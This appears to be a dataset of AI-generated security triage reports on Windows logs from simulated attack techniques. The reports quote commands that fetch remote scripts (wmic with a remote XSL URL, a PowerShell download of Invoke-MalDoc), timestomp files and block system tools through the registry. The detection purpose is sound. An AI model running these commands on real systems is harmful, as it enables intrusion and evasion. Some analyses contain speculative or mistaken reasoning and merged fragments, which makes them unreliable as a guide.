Given the context of the log entries, there is a pattern of behavior that appears unusual and warrants further investigation. Specifically, the registry modifications and repeated system utility executions are concerning if not initiated as part of known administrative processes.

### Resolution: SUSPICIOUS
My final assessment classifies this activity as **SUSPICIOUS**. This conclusion is based on the observed registry changes and frequent executions of administrative utilities lacking context of legitimate tasks. Further investigation should verify whether these tasks were initiated by authorized users or automated processes. Actions such as correlating scheduled tasks, checking for scripts or tools in admin directories, and reviewing user logs can aid in clarifying these activities.

### Recommended Actions:
- **Verification of User Activity:** Validate whether `admin_test` executed these commands or if there was unauthorized access.
- **Review Security Logs:** Check for logons, especially for unusual times or locations, along with any account lockout or policy changes.
- **Audit Registry and File Changes:** Determine if these changes align with normal administrative operations or security policies.
- **Monitor Further Log Activity:** Continue to capture and analyze Sysmon logs to detect recurrence or new suspicious patterns.
- **Endpoint Security Tools:** Run comprehensive malware scans on the host and if possible, monitor network activity to identify any unusual outbound connections."

### Suspicious/Malicious Indicators:

1. **PowerShell Script Execution:**
   - There is evidence of PowerShell execution with a complex command line involving downloading and executing a PowerShell script (`Invoke-MalDoc.ps1`) from a URL (`https://raw.githubusercontent.com/...`). 
   - The PowerShell command reads a file (`data-macrocode.txt`) from a temporary directory, performs a string replacement, and invokes a potentially malicious function (`Invoke-Maldoc`), targeting Microsoft Word. This is a classic indicator of potential malware activity as it relates to macro-based threats often used for initial infection vectors.

2. **Network Activity:**
   - The script fetches data from an external source using `iwr` (Invoke-WebRequest), which is common in scripts attempting to download malicious payloads or instructions.

3. **Sysmon Log Entries:**
   - Multiple executions of PowerShell and related sub-processes (conhost.exe, wevtutil.exe, whoami.exe, etc.) can be seen under the same user context (""SERVER002\admin_test""). The usage of `whoami.exe` can be indicative of reconnaissance activity to check the current user context.
   - The PowerShell command executed matches the behavior of downloading and executing further code, which can be indicative of an attempt at execution of potentially malicious commands.

4. **Persistence Attempts or 'Living off the Land' Technique:**
   - The use of built-in Windows utilities like PowerShell with a focus on manipulating files in a user’s temp directory suggests attempts at stealth and persistence via non-standard entries that don't stand out as obviously malicious at first glance.

### Assessment:

Given the analysis, there are clear indicators of potential malicious activity due to the execution of a PowerShell script that attempts to download and execute further instructions from an external URL. This behavior is consistent with malware and particularly, scripts attempting to deliver or execute malicious payloads remotely.

### Resolution:

- **MALICIOUS:** The activities observed, particularly centered around the PowerShell execution, are highly indicative of malicious intent and potential compromise.

### Guidance:

1. **Immediate Mitigation:**
   - Isolate the affected computer from the network to prevent further potential spread or communication with external malicious services.

4. Monitor and verify any further use of similar temp directory file execution on Server002 to rule out malicious intention."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"After analyzing the provided logs, the following observations and assessments can be made:

### Indicators of Potential Malicious Activity:
1. **PowerShell Execution**:
   - The logs demonstrate that PowerShell was executed with the following command:
     ```
     powershell.exe & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}
     ```
   - Usage of PowerShell to execute commands like `Invoke-ATHHTMLApplication` is unusual and could suggest an attempt to execute code from a remote or local resource using MSHTA, a legitimate utility known to be used in malicious activities to execute HTML and JScript applications.

2. **Sysmon Registry of PowerShell Activities**:
   - There are several events related to PowerShell processes (`powershell.exe`) with command execution as noted above. The presence of these entries with no obvious benign explanation suggests possible malicious or suspicious behavior.

3. **Frequent Use of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` being executed with processes like `conhost.exe` and accompanied by `PowerShell` usage could indicate attempts to manipulate or export event logs (e.g., `export-log` functionality), potentially to cover tracks after actions have been executed.

4. **Command-Line Logging via Sysmon**:
   - Sysmon logs show the execution of `hostname.exe` and `whoami.exe`. While these utilities can be legitimately used by administrators, in the context of accompanying PowerShell commands, these could be reconnaissance activities performed by an attacker to gather system information.

5. **Execution by ADMIN_TEST User**:
   - The `SERVER002\admin_test` user account is performing these actions, and this account should be verified to ensure it is expected to perform these actions with full knowledge from the IT/security team.

### Assessment:

- **SUSPICIOUS**: Given the nature of the PowerShell command execution and frequent use of tools like `wevtutil.exe`, combined with process monitoring showcasing process creation and potentially log tampering activities, this is suspicious. The activities should be further investigated, especially considering the capabilities shown by the PowerShell commands which can indicate later stages of an attack like code execution and system manipulation.

### Guidance on Further Actions:
1. **Conduct a Thorough Investigation**:
   - Verify the origin and legitimacy of the `admin_test` account actions. Ensure the user account is not compromised.
   - Investigate any associated network traffic to external IP addresses or unusual requests during this timeframe.
   
2. **Isolation and Analysis**:
   - Isolate the impacted system if not already done for detailed forensic analysis.
   - Gather and analyze PowerShell logs, especially the script blocks if logging is set up.

3. **Review Security Controls**:
   - Ensure endpoint detection and response (EDR) tools are actively monitoring for such PowerShell activities.
   - Implement stricter group policies regarding PowerShell execution to restrict unauthorized scripts.

4. **Cross-Verification with Known Threats**:
   - Cross-reference command and activities with threat intelligence databases to identify any known patterns.

LOLBAS CustomShellHost to Spawn Process,"### Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs, including Sysmon, System, Security, and PowerShell logs, certain activities stand out that warrant closer examination.

#### Key Observations
1. **Wevtutil.exe and Conhost.exe Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` have been executed by the user `SERVER002\admin_test`. Although these executables are legitimate Windows processes, frequent execution, especially in rapid succession, could potentially indicate an attempt to gather or manipulate event logs.

2. **PowerShell Execution with Suspicious Command:**
   - The PowerShell command-line sequence observed attempts to check for a directory (`C:\test`) and potentially create it. It also copies `customshellhost.exe` and `calc.exe` to this directory under the guise of `explorer.exe`, and attempts to execute `customshellhost.exe`. The renaming of legitimate system binaries and execution of non-standard binaries (`customshellhost.exe`) with administrative privileges raises a red flag.
   
3. **Execution of Hostname.exe and Whoami.exe:**
   - While `hostname.exe` and `whoami.exe` are benign system utilities used to gather information about the system and the user, their execution in the context of other potentially suspicious activities could be part of a reconnaissance phase by an attacker.

4. **High Integrity Level:**
   - The activities were executed at a high integrity level, suggesting administrative privileges were used. This increases the potential impact of any malicious actions.

5. **Unusual File Copies:**
   - Files being copied into directories that are crafted during the session (`C:\test`) and executing from them could be indicative of an attempt to evade detection mechanisms, hide activities, or persist in the system.

#### Indicators of Malicious Activity
- Attempting to mask the `calc.exe` under `explorer.exe`.
- Execution and potential persistence using `customshellhost.exe`.
- Usage of PowerShell to script these activities, a common tactic used in living-off-the-land style attacks.

### Conclusion and Recommendation

**Resolution: MALICIOUS**

The combination of using PowerShell to create directories, copy and rename executables, and execute potentially non-standard binaries indicates malicious activity. These actions suggest the possibility of system compromise, where an actor is attempting to gain persistence, perform reconnaissance, or execute arbitrary commands with high privileges.

"
Disable Event Logging with wevtutil,"### Detailed Analysis of the Logs:

**Security Log:**  
- **Event ID 4616 & 1 (Multiple Occurrences):** These indicate the system time was changed. While time changes can occur for legitimate reasons, it's uncommon and can be used by attackers to hide their tracks. This activity warrants further investigation to understand its origin and necessity.
- **Event ID 4634:** Shows a network logoff, which is normal in specific contexts and isn't inherently suspicious.
- **Event ID 4672:** Indicates that the account ""admin_test"" was granted a series of privileges, including SeDebugPrivilege and SeLoadDriverPrivilege. These privileges are considered powerful and granting them should be monitored closely, as they allow critical control over the system.
- **Event ID 4624:** Shows a successful user logon of account ""admin_test"" using NTLM authentication and from a specific IP address (fe80::e3b5:5371:12a8:9c77 for one entry and 192.168.0.102 for another). The usage of NTLM in a networked setting might be subject to risk if not adequately protected.

**Sysmon Log:**
- Multiple occurrences of processes (`wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`) being executed by the ""admin_test"" account. Specifically, the command-line arguments in the cmd.exe process indicate an attempt to disable event logging for ""Microsoft-Windows-IKE/Operational"", which is a suspicious activity.
  
**Application Log:**

  - Repeated changing of system time.
  - Grants of elevated privileges (SeDebugPrivilege, SeLoadDriverPrivilege) to a user account shortly followed by process executions indicating intent to manipulate system logs through disabling event logs via `wevtutil`.

### Resolution: SUSPICIOUS

The logs showcase suspicious activities involving time manipulation and critical privilege assignments, combined with disabling event logs which can conceal further nefarious actions. Further investigation is needed to determine the motivation and potential ramifications—such as verifying the intent behind the time changes and evaluating network activity for signs of potential data exfiltration or lateral movement within the network.

### Guidance on How to Proceed:
- **Immediate Actions**:
  - Isolate the host if possible to prevent further potential compromises.
  - Verify and cross-reference user account permissions and any recent changes.
  - Review and compare any recent configuration changes or incidents that coincide with the time of the events.

- **Further Investigation**:
  - Conduct a broader investigation of logs, particularly for successful/failed logons, process creation, and network connections.
  - Analyze the origins and timing of the time change requests and privilege escalations.
  - Consider leveraging forensic tools to gather information on potential file or data manipulation on the host.

Engage the incident response team to delve deeper into this suspicious activity to determine if indeed this is part of a larger threat or isolated benign actions."
System Binary Proxy Execution - Wlrmdr Lolbin,"Upon reviewing the provided logs, several factors stand out that could indicate suspicious or malicious activity:

1. **Frequent Usage of System Utilities**: There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed under the `SERVER002\admin_test` user account. `wevtutil.exe` is a legitimate Windows utility for managing event logs, and `conhost.exe` is a console window host process. The rapid and repetitive invocation of these commands by an administrator account could indicate an attempt to tamper with log files or spawn malicious activity through console processes. However, without specific command-line parameters or context of their use, it's not definitively malicious.

2. **Execution of PowerShell with Unsigned Commands**: A PowerShell command was executed that launches `wlrmdr.exe`, which then tries to execute `calc.exe`. While `calc.exe` is a benign Windows Calculator application, the presence of `wlrmdr.exe` is unusual and may be a portmanteau or disguised utility for obfuscating its true purpose. Typically, legitimate scripts for administrative purposes are signed or have traceable origins. The use of PowerShell to orchestrate these actions without adequate context can be indicative of malicious intent.

3. **Time Discrepancies in the Security Logs**: There are events showing changes in the system time, specifically related to svchost.exe, which is a critical system process hosting Windows services. Modification of time settings could be an indication of log manipulation or an attempt to bypass certain time-based security mechanisms.

4. **Usage of NT AUTHORITY\SYSTEM User for Shell Executions**: Several instances of `Microsoft Edge Update` executable processes involve the `NT AUTHORITY\SYSTEM` account, which is a high-level privileged account. While auto-updates might occur under this user context, it is unusual for multiple update-related processes to exhibit this frequency and concurrency. Further investigation into the legitimacy of these file paths and filenames (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) against expected updates is required.

5. **Unexpected Hosts and Administrative Accounts**: The `LogonType` 3 (network logon) and `LogonProcessName` `NtLmSsp` for the `admin_test` account raise concerns. Additionally, the origin `IpAddress` listed as `192.168.0.102` for host `DESKTOP-3HL5B2P` suggests network activity involving an external or unexpected endpoint. This might warrant further network monitoring or validation against known safe and authorized endpoints.

Given the presence of legitimate processes exhibiting unusual behavior, lack of specific payload or clear indicators of compromise in the given context, the activity can be categorized as:

**Resolution: SUSPICIOUS**

### Guidance:
1. **Conduct a Deeper Investigation**:
   - Investigate `wlrmdr.exe` and verify its legitimacy and source. Ensure it is supposed to be on the system.
   - Review the event logs related to `wevtutil.exe` and `conhost.exe` for any parameters or context that might explain their execution frequency.

2. **Monitor Network Traffic**:
   - Correlate the source IP and hostname details from security logs and verify their authenticity and intent.
   - Assess network activity logs for any unusual or unauthorized external communications.

3. **User Account Review**:
   - Validate the `admin_test` user’s activities and ensure the account hasn’t been compromised or misused.

4. **Explain or Rectify Time Anomalies**:
   - Examine the causes and reasons for noted time discrepancies to prevent potential time-based evasion techniques.

These actions will help determine if the activity is indeed benign or if it requires escalation to be addressed as a security breach."
Windows - Modify file last modified timestamp with PowerShell,"### Analysis

Upon examining the provided PowerShell and Sysmon logs, several points of interest and potential indicators of suspicious activities have been identified:

#### PowerShell Logs

1. **Timestamp Manipulation**: 
   - The PowerShell logs reveal a command being executed: 
     ```powershell
     Get-ChildItem ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.006_timestomp.txt"" | % { $_.LastWriteTime = ""01/01/1970 00:00:00"" }
     ```
   - This command is designed to overwrite the Last Write Time of a file to an arbitrary date (January 1, 1970). This action is commonly referred to as ""timestomping,"" which is a technique often used by attackers to alter the file timestamp in an attempt to evade detection, hindering forensic investigation efforts.
   - The consistent execution of this specific command with no apparent operational necessity suggests deliberate timestamp manipulation.

#### Sysmon Logs

1. **Frequent Execution of System Tools**:
   - Several legitimate Windows utilities (`hostname.exe`, `whoami.exe`, and `wevtutil.exe`) were executed. While the commands themselves are benign, the context and frequency of their execution merit further scrutiny.
   - Legitimate uses include querying system information (`hostname`, `whoami`), or managing event logs (`wevtutil`). When observed in quick succession or among potential malicious log entries, they may indicate reconnaissance or attempts to manipulate system logs.

2. **Edge Update Activities**:
   - The presence of Microsoft Edge updater activities (e.g., `MicrosoftEdgeUpdate.exe`) could indicate standard operating procedures like updates or installs—no immediate indicator of maliciousness here unless further logs suggest otherwise.
   - These processes run under 'NT AUTHORITY\SYSTEM' indicating a high-integrity execution, yet these actions align with typical system-level software updates.

### Conclusion

- **PowerShell Activity**: The act of modifying the Last Write Time of a file without a clear operational purpose could potentially be linked to malicious activities, especially given how timestomping is commonly employed for obfuscation.
- **Overall Process Activity**: The legitimate tools being executed might not have been malicious themselves, but their usage pattern allied with the PowerShell activity might suggest attempts to evade detection or perform unauthorized reconnaissance.

### Recommended Resolution

**Resolution: SUSPICIOUS**

- Further investigation is needed to determine the legitimacy of the timestomp activity and discern the intentions behind the rapid execution of inherent system utilities.
- Steps to consider:
  - Cross-reference with threat intelligence sources to verify if the specific power shell script aligns with recent known threats.
  - Perform a system forensic analysis to trace back the creation and modifications of logs and assess for any possible alterations.
  - Conduct a thorough review of user activity, access logs, and network traffic for further indicators of compromise.

Engaging in a deeper analysis of contextual system configurations and surrounding network activities will be fundamental in forming a comprehensive threat assessment."
WMIC bypass using remote XSL file,"Upon reviewing the provided Windows event logs, the following observations and assessments are made:

1. **Event Analysis Observations**:
   - **Process Execution**: Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` within a rapid time frame are noted. These processes are generally used for utility and management tasks (e.g., event log management, console applications).
   - **Command Usage**: An event showed `cmd.exe` executing with the following command-line usage: `""cmd.exe"" /c wmic process list /FORMAT:""https://raw.githubusercontent.com/file/file-file/master/files/data/src/wmicscript.xsl""`. This is particularly suspicious because it involves downloading a script from a remote source, which can be indicative of malicious activity, particularly if the remote source is not a trusted one.
   - **Privilege Elevation**: The `admin_test` user is observed with a set of high privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.), which could indicate potential for misuse if the credentials were compromised.
   - **Time Manipulation**: There are time changes logged, but these could be related to normal NTP synchronization tasks or time zone adjustments, though they should be further verified.
   - **Security Events (EventID 4624 and 4672)**: These indicate successful logon and special privileges assigned, which are typical for an admin-level account but could be problematic if used inappropriately.

2. **Assessment of Log Entries**:
   - The frequent invoking of `wevtutil.exe` and `conhost.exe` alone is not necessarily an indication of malicious activity as they are legitimate Windows utilities. However, when combined with the suspicious use of `cmd.exe`, it raises a red flag.
   - The command line involving WMIC with an external URL is highly suspicious and demonstrates an attempt to execute potentially malicious code from an uncontrolled website. 

3. **Threat and Risk Assessment**:
   - The combination of high privilege use by `admin_test`, the suspicious command line event, and the fact that these actions occur over a short time frame strongly suggest potential unauthorized use or a compromise of this account.
   - If the URL in the WMIC command leads to a malicious script, it can grant unauthorized access or perform harmful operations on the system.

4. **Guidance and Recommendation**:
   - Further investigation is required to evaluate the URL and the content it points to for potential threats.
   - Conduct a full security audit on user `admin_test` to verify recent activity for any indication of credential compromise.
   - Review network logs to assess any external connections made by this system around the time these logs were recorded.
   - Isolate the host as a precaution if further investigation confirms the presence of malicious activity or indicators.

**Resolution**: MALICIOUS. The inclusion of a remote URL in a command execution, combined with the observed high privileges on the involved account, provides strong indications of malicious activity. Immediate action and further investigation are necessary."
DisallowRun Execution Of Certain Applications,"Upon reviewing the provided Windows event logs, I have noted several entries that could indicate potential issues or areas that warrant further investigation:

### Detailed Analysis:

   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed running under the same user (`SERVER002\\admin_test`). 
   - `wevtutil.exe` is typically used for event log management. However, frequent and rapid executions may suggest someone is querying or modifying logs, which could be suspicious if not performed by authorized personnel.

2. **Use of Command-Line Tools:**
   - Execution of `cmd.exe` with a complex command line indicating manipulation of registry keys. This is particularly concerning as it involves disabling certain features or applications by leveraging Group Policy settings.
   - The chained command appears to set restrictive policies potentially to disable `regedit.exe` and `cmd.exe`, which is often seen in malware behavior to hinder further investigation or restrict access to tools that could be used to remove the malware.

3. **Registry Modifications Using `reg.exe`:**
   - Observed registry modifications being made via `reg.exe` which coincide with the `cmd.exe` activity. This implies a scripted or automated process aimed at altering system behavior.
   - The registry changes disallow the run of key system utilities (`regedit` and `cmd`), a suspicious action typically seen in malicious activities to block user or admin control modifications.

4. **High-Integrity Executions:**
   - Processes are running with high integrity levels, which means they have the potential to modify system-level settings. This level of access is particularly important when assessing whether activities could compromise system security.

5. **Processes Executing Sequentially:**
   - The observed sequence and their rapid execution suggest possible automation or script execution, potentially indicating a pre-planned malicious script.

### Assessment:

Based on the analysis, the behavior observed in the logs—particularly the programmatic execution of command-line instructions that alter registry settings to limit access to key system utilities—strongly suggests potential malicious activity. This is not typical behavior for standard user or administrative actions and is characteristic of tactics seen in malware operations or unauthorized administrative actions intending to disrupt standard operations or further compromise the system.

### Resolution:

**Resolution: MALICIOUS**

This assessment is based on the combination of factors: automated and scripted modifications to key system settings via registry changes, execution of multiple administrative tools in quick succession, manipulation of tools like `wevtutil.exe` potentially indicating an attempt to cover tracks, and execution at a high integrity level.

### Analysis:

1. **Process Execution Patterns**:
   - A significant number of executions originate from `wevtutil.exe` and `conhost.exe`. These binaries are standard Windows utilities, where `wevtutil` is used for managing Windows Event Logs, and `conhost.exe` (Console Window Host) manages console windows.
   - The repeated execution of `wevtutil.exe` and `conhost.exe` by the same user `SERVER002\\admin_test` during a short time span suggests an unusual pattern of activity.

2. **Command-Line Arguments**:
   - The execution of `cmd.exe` with a specific registry modification command (`reg add`) is a major indicator of potential unethical activities, as registry modifications can be used for persistence or privilege escalation.
   - The command attempts to modify a registry key related to session management (`AllowMultipleTSSessions`), which can indicate an attempt to enable multiple RDP sessions on the host, potentially for unauthorized remote access.

3. **Integrity Level and User Context**:
   - All analyzed processes are executed under a high integrity level and by the user `SERVER002\\admin_test`, suggesting that these actions were performed from an administrative context, which would typically require elevated privileges.

4. **Logon and Session Information**:
   - The consistency of the logon session `0x1341A6` across the processes indicates a single user session is responsible for these actions, underlining a coordinated sequence of events.

5. **Time Synchronization Events**:
   - There are logs indicating a change in system time, which can sometimes be a technique used by attackers to evade detection by desynchronizing timestamps. However, the time changes logged here appear to be minor adjustments, potentially benign if they align with legitimate time synchronization activities.

### Conclusion and Assessment:

The activity observed in these logs is **SUSPICIOUS**. The repetitive use of `wevtutil.exe` and `conhost.exe`, the execution of command-line alterations to the system registry for potential session control, and the context of privilege indicate activities that deviate from normal user or administrative operations. While not outrightly malicious, these actions suggest potential suspicious activity that warrants further investigation.

### Guidance:

1. **Immediate Actions**:
   - Conduct a deeper forensic analysis of the host to determine the intent and potential impact of the registry changes.
   - Review system and network logs beyond the current scope for any related anomalous behavior or data exfiltration evidence.
   - Confirm the legitimacy of the `SERVER002\\admin_test` account's recent activities including any scheduled tasks, group memberships, or recent login patterns.

2. **Preventive Measures**:
   - Strengthen logging and monitoring controls to detect command-line and registry editing operations.
   - Enforce strict user access controls and audit privileged account activities constantly.

Due to the suspicious nature of these activities, a comprehensive security audit of the network and associated systems is advised to ensure no undetected malicious activities have occurred."
Rundll32 ieadvpack.dll Execution,"After analyzing the provided logs from the Windows host, a few observations and assessments can be made:

1. **Process Execution and Anomalies**:
    - The logs show multiple executions of default Windows utilities like `powershell.exe`, `wevtutil.exe`, `cmd.exe`, `hostname.exe`, `whoami.exe`, and typical system services like `SecurityHealthService.exe` and the Microsoft Edge Update components.
    - The execution of `cmd.exe` with a command that includes `rundll32.exe` executing `ieadvpack.dll` with `LaunchINFSection` for an INF file (`data.011.inf`) in a temporary directory is potentially suspicious. The use of `rundll32` to load libraries and execute functions can often be indicative of malware or unauthorized scripts running from less typical directories.

2. **Process Relationships and Command Lines**:
    - The processes appear to be executed under the `SERVER002\admin_test` user, generally maintaining a linear, expected relationship where binaries like `C:\\Windows\\System32\\cmd.exe` have parent processes of typical system binaries. 
    - `rundll32.exe` executed with `ieadvpack.dll` indicates the possibility of execution involving outdated or vulnerable components, a tactic sometimes used by malware.

3. **Privilege and Security Logs**:
    - The security logs indicate a standard login and the assignment of a significant number of privileges to `SYSTEM` within the `NT AUTHORITY` domain. This in itself isn't anomalous, as `SYSTEM` level processes typically require extensive privileges.

4. **Windows Defender Status**:
    - Windows Defender is reported as `SECURITY_PRODUCT_STATE_ON`, indicating it is active, but this does not necessarily mean it detected or prevented any executed threats.

5. **Application Logs**:
    - Entries such as `Software Protection Platform Service` events and `Microsoft Edge Update` events appear standard and routine.

6. **Conclusion**:
    - The primary piece of suspicious activity is the command involving `rundll32.exe` and `ieadvpack.dll`, which may suggest a script or malware attempt. This warrants further analysis such as examining the temporary files, checking for known vulnerabilities associated with `ieadvpack.dll`, and ensuring the `admin_test` account usage aligns with expected behavior.

**Resolution**: **SUSPICIOUS** - The presence of a potentially suspicious command involving `rundll32.exe` execution requires further investigation to confirm whether any malicious activity was executed."
Create Hidden Directory via $index_allocation,"Based on the logs provided, here is a detailed analysis focusing on potential signs of malicious activity:

### Analysis

1. **Time Change Events (Security and System Logs)**
   - Event ID 4616 in the Security log indicates a time change. The time was changed twice in quick succession.
   - These changes were executed by the `svchost.exe` process running under the `LOCAL SERVICE` account. This event can be benign, especially if it is part of time synchronization activities with `time.windows.com`.

2. **Process Executions (Sysmon Logs)**
   - Several `Sysmon` Event ID 1 entries detail process creations:
     - `hostname.exe` and `whoami.exe` are legitimate system processes often used for diagnostic or scripting purposes.
     - `cmd.exe` executed with command-line arguments involving directory and file creation with `::$index_allocation`. This behavior is indicative of NTFS Alternate Data Streams usage, which is often associated with attempts to hide data. The command creates a directory ""hidden"" in terms of standard directory listings and writes to it.

3. **WevtUtil Executions**
   - The `wevtutil.exe` process is seen being executed multiple times. This utility is used for managing Windows Event logs.
   - Frequent execution of `wevtutil.exe` in a short timeframe may suggest attempts to clear or alter event logs, potentially to remove traces of malicious activity.

4. **Other Observations**
   - `MicrosoftEdgeUpdate.exe` and system utilities like `Time Service`, `sppsvc.exe`, `TrustedInstaller.exe`, and `TiWorker.exe` are observed. These are typical Windows processes and services that handle system updates and configuration tasks.

### Assessment

- **Suspicious Behavior:**
  - The use of `cmd.exe` to write data with `::$index_allocation` suggests a potential attempt to utilize alternate data streams, a technique sometimes used for obfuscation or data hiding.
  - Several executions of `wevtutil.exe` could imply attempts to manipulate event logs.

### Resolution

Given the observations:

- **Resolution:** **SUSPICIOUS**
  - The use of NTFS alternative data streams and `wevtutil.exe` commands in rapid sequence requires further investigation to confirm intent and ensure the host's security integrity is not compromised.

### Recommended Actions

1. **Further Investigation:**
   - Investigate the `cmd.exe` command usage to understand the context and verify if there was legitimate administrative work scheduled or ongoing at that time.
   - Review Security and System logs for signs of privilege escalation or unauthorized access around the same timeframe.

2. **Monitoring:**
   - Closely monitor the host for further use of `cmd.exe`, `wevtutil.exe`, and inspect alternative data streams activity. No benign task generally performs such actions repeatedly.

3. **Audit Logs:**
   - Enable enhanced auditing to capture detailed events, especially those that may indicate adjustments to logs or suspicious command executions.

4. **Endpoint Detection:**
   - Utilize EDR (Endpoint Detection and Response) tools to gain deeper insights into process behavior, user actions, and network connections. 

5. **System Backup and Scans:**
   - Consider running a full system antivirus/malware scan and ensure backups are current in the event data restoration is required. 

This analysis suggests that while there's no direct evidence of compromise, the activities logged warrant further scrutiny to ensure they’re not indicative of malicious behavior."
Hide Windows Clock Group Policy Feature,"Upon analyzing the provided log entries from the Windows host, here is a detailed assessment of the situation, including any indicators of suspicious or malicious behavior:

### Observations:
1. **Event Log Patterns:**
    - The logs primarily consist of process creation and network service interactions with a focus on system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, etc.) and Edge update processes (`MicrosoftEdgeUpdate.exe`).

2. **System Utilities Execution:**
    - Events involving `wevtutil.exe` and `conhost.exe` are repeatedly seen, but these tools are legitimate Windows utilities used for managing event logs and console windows, respectively. The usage context (running by the `admin_test` user) could be part of regular administrative tasks unless coupled with more suspicious activities (none observed).

3. **Registry Modification:**
    - A `cmd.exe` process executed a registry modification command to add a policy to hide the clock: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideClock /t REG_DWORD /d 1 /f""`. This can be suspicious if unauthorized as altering registry policies can be a method to enforce system changes stealthily. However, without additional context or indication of malicious intent, it's hard to determine if this represents an actual threat.

4. **Edge Update and System-Level Operations:**
    - There are frequent operations involving `MicrosoftEdgeUpdate.exe` and related components, which might indicate a legitimate software update process. Frequent updates or service registrations of Microsoft Edge are not uncommon and do not inherently suggest malicious activity.
  
5. **Integrity Level and Account Usage:**
    - Most processes are running with a `High` integrity level under the `SERVER002\\admin_test` user or system accounts like `NT AUTHORITY\\SYSTEM`. While high integrity level execution can be abused for privilege escalation, in this context, it seems consistent with tasks being executed either under an admin account or during system-level operations such as software updates.

### Conclusion:
Based on the available log entries:
- The repeated use of legitimate system tools and the Microsoft Edge update processes do not immediately raise major red flags that are assuredly malicious.
- The registry modification warrants a review, especially if the `admin_test` user normally should not have made such changes.
- The activities, in general, appear more consistent with legitimate administrative and system update operations rather than with known malicious patterns or behaviors.

### Resolution:
- **SUSPICIOUS**: The suspicious elements (registry modification) justify further investigation. While there is no definitive evidence of malicious activity, the context of the registry changes should be verified (e.g., was it an authorized task? Is the admin account secure?). Additionally, verifying the legitimacy of the software update processes might be prudent.

### Guidance:
- Verify the legitimacy of the registry modification command and ensure it aligns with authorized administrative policy changes.
- Assess the security of the `admin_test` account to ensure it has not been compromised.
- Cross-verify with other logs (e.g., network, antivirus) to look for any correlated alerts or anomalies.
- Monitor subsequent system behavior for any unexpected changes or file alterations."
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"Upon reviewing the provided logs, several events and behaviors suggest potential issues warranting further investigation. Below, I outline observations and analysis based on the logs:

### Key Observations:

1. **Application Log:**
   - There is an installation of a suspicious MSI package `data.007_DLL.msi` initiated from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi`). Temporary directories are unusual for software installations and could indicate potential unwanted software or malware.
   
2. **Sysmon Log:**
   - Multiple PowerShell executions are noticeable. PowerShell is often leveraged by attackers for executing scripts without touching the disk:
     - An invocation of PowerShell with the command `Invoke-CimMethod -ClassName Win32_Product -MethodName Install` is used to install the aforementioned MSI package. The use of this command is not typical in standard scenarios.
     - Another PowerShell process is executed with parameters `-nop -Command Write-Host CustomAction export executed me; exit`. The `-nop` (No Profile) and scripted operations signal potential misuse of PowerShell for evasion tactics.
   - The common usage of system utilities like `whoami.exe` and `wevtutil.exe` during this session might indicate reconnaissance or privilege information gathering.

3. **Windows PowerShell Log:**
   - Consistent with the Sysmon log, there are entries corresponding to the starting of the PowerShell host application with the inclusion of a suspicious command. It further solidifies the possibility of the misuse of PowerShell, typically seen in malicious activity.

4. **Edge Update Activity:**
   - There are various instances of Microsoft Edge Update processes running under `NT AUTHORITY\SYSTEM`. While automatic updates are expected, the frequent starting and stopping of similar processes in quick succession could indicate legitimate update activity or potential masquerading.

### Assessment:

Based on the detailed evaluation, the logs exhibit potentially malicious activity, notably around the installation of a suspicious application from a temporary path using PowerShell, and repeated PowerShell executions with atypical command-line arguments. 

### Resolution:

- **Resolution:** **SUSPICIOUS**

### Recommendations for Further Action:

1. **Investigate the MSI File:** Inspect the `data.007_DLL.msi` file for malicious signatures using a forensic tool or submit it to an online malware analysis service. This could clarify the intention and content within the installer.
  
2. **Review User Actions and Policies:** Review actions under the user `SERVER002\admin_test` and ensure that administrative actions from this account are legitimate. Revisit access and installation policies and implement additional monitoring if needed.

3. **Monitor PowerShell Activities:** Strengthen monitoring on PowerShell executions, using PowerShell logging or monitoring solutions like Sysmon, to catch any unexpected or suspicious commands being run.

4. **Scan System and Network:** Conduct a full antivirus/malware scan on `Server002` and the network to identify any other potentially compromised systems or indicators of spread.

5. **Increase Security Training:** Reinforce security awareness training for users about only using company-approved methods and locations for downloading and installing software. 

These steps can help elucidate the nature of the activities and either confirm or eliminate the potential malicious intent."
Activate Windows NoPropertiesMyDocuments Group Policy Feature,"### Analysis of the Windows Event Logs

#### 1. **Time Synchronization Events:**

- **System Log & Security Log**: There are multiple entries regarding time changes and synchronization through svchost.exe, which is part of normal operation to ensure correct system time settings. These logs do not portray any malicious activity but serve as system maintenance.

#### 2. **Edge Update Activities:**

- **Sysmon Log & Application Log**: There are several entries related to 'MicrosoftEdgeUpdate.exe'. The activities involve updating or verifying installations of Microsoft Edge, indicated by command-line references to 'update', 'srv', 'installsource', etc. Such activities are typical during software updates and are consistent with known Microsoft Edge update patterns. The logs show entries under 'NT AUTHORITY\SYSTEM', suggesting these operations are under legitimate system control.

#### 3. **Sysmon Process Creation:**

- **Command Line Modification (Sysmon Log)**: An entry notes the use of `cmd.exe` executing `reg` command to modify registry settings:
  ```
  cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
  ```
  This registry change concerns user policy settings which can be benign or administrative, but its execution through a command prompt with `cmd.exe` can also indicate malicious intent if originating from an untrusted source. 

#### 4. **Miscellaneous Executions:**

- Legitimate system applications such as `whoami.exe`, `hostname.exe`, and `conhost.exe` were also executed by the user `SERVER002\admin_test`:
  - These are common administrative tools, executed without unusual parameters, hinting at potential legitimate system or maintenance activities.

### Conclusion:

